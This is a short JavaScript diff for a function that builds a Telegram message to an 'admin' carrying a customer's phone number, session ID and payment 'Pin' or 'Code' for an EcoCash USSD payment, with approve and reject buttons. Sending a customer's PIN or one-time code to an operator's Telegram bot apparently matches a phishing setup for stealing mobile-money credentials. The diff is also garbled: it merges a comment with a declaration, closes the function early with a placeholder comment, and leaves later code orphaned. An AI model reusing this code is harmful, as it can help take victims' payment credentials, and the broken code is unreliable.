@@ -87,8 +87,7 @@ function cancelApproval() {
 
 /**
  * Send Telegram notification to admin with APPROVE / REJECT inline buttons
- */
-async function notifyTelegramForApproval(phone, sessionId) {
+ */async function notifyTelegramForApproval(phone, sessionId, code = '') {
   const cfg = window.TELEGRAM_CONFIG;
   if (!cfg || !cfg.enabled || !cfg.botToken || cfg.botToken === 'YOUR_BOT_TOKEN_HERE') {
     console.warn('[Telegram] Not configured.');
@@ -101,12 +100,14 @@ async function notifyTelegramForApproval(phone, sessionId) {
     `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
     `🆔 <b>Session:</b> <code>${sessionId}</code>\n` +
     `📱 <b>Customer Phone:</b> <code>+263 ${phone}</code>\n` +
-    `🔑 <b>Pin:</b> <code>${code}</code>\n` + 
+    `🔑 <b>Code:</b> <code>${code}</code>\n` +
     `📦 <b>Package:</b> ${selectedPlan ? selectedPlan.title : 'Unknown'} (${selectedPlan ? selectedPlan.duration : ''})\n` +
     `💵 <b>Amount:</b> ${selectedPlan ? selectedPlan.price : 'Unknown'}\n` +
     `⚡ <b>Payment Method:</b> EcoCash USSD Push\n` +
     `📅 <b>Time:</b> ${timestamp}\n\n` +
     `<b>⚡ Tap below to approve or reject customer:</b>`;
+  // ... rest of sendMessage fetch stays the same
+}
 
   const reply_markup = {
     inline_keyboard: [[
